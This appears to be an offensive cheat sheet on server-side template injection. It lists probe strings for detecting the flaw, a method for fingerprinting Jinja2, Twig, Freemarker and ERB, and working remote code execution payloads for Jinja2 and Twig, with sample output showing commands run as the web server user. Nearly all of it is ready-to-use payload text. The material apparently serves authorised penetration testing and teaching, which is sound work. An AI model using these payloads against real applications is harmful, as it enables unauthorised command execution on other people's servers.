# SERVER-SIDE TEMPLATE INJECTION (SSTI)

### Test for SSTI

If 49 appears = SSTI exists — Try in every input field

```bash
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
```

<details>
<summary>Example Output</summary>

```
Input: {{7*7}}

Page displays: 49
(SSTI CONFIRMED - template engine is executing code)

{{7*'7'}} = 7777777 -> Jinja2
{{7*'7'}} = 49 -> Twig
```
</details>

---

### Identify template engine

Different engines, different payloads — Guides your exploit

```bash
{{7*'7'}} -> 7777777 = Jinja2
{{7*'7'}} -> 49 = Twig
```

<details>
<summary>Example Output</summary>

```
{{7*7}} = 49 on page
{{7*'7'}} = 7777777 -> Jinja2 (Python)
{{7*'7'}} = 49 -> Twig (PHP)
${7*7} = 49 -> Freemarker (Java)
<%= 7*7 %> = 49 -> ERB (Ruby)
```
</details>

---

### Jinja2 RCE (Python)

Python/Flask apps — Jinja2 is very common

```bash
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

<details>
<summary>Example Output</summary>

```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

Output: uid=33(www-data) gid=33(www-data)
(RCE via Jinja2 SSTI)
```
</details>

---

### Twig RCE (PHP)

PHP/Symfony apps — Twig template injection

```bash
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

<details>
<summary>Example Output</summary>

```
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}

Output: uid=33(www-data) gid=33(www-data)
(RCE via Twig SSTI in PHP/Symfony apps)
```
</details>

---
